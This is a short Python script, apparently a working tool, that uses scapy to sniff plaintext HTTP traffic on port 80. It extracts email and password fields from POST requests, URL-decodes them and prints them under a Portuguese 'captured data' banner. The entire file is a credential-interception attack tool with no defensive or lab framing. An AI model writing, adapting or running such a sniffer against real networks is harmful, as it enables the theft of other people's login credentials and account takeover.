from scapy.all import sniff, Raw
from urllib.parse import unquote

def processar(pacote):
    if pacote.haslayer(Raw):
        try:
            data = pacote[Raw].load.decode(errors="ignore").lower()

            if "post" in data and ("email=" in data or "passwd=" in data):

                print("\n[🚨 DADOS CAPTURADOS 🚨]")
                print("-----------------------------------------")

                # Extrai e decodifica o email
                if "email=" in data:
                    email_raw = data.split("email=", 1)[1].split("&")[0]
                    email = unquote(email_raw)
                    print(f"[EMAIL]  {email}")

                # Extrai e decodifica a senha
                if "passwd=" in data:
                    pass_raw = data.split("passwd=", 1)[1].split("&")[0]
                    password = unquote(pass_raw)
                    print(f"[PASSWD] {password}")

                print("-----------------------------------------\n")

        except Exception:
            pass

print("[*] Sniffer ativo. Aguardando POSTs decodificados...")
sniff(filter="tcp port 80", prn=processar, store=False)
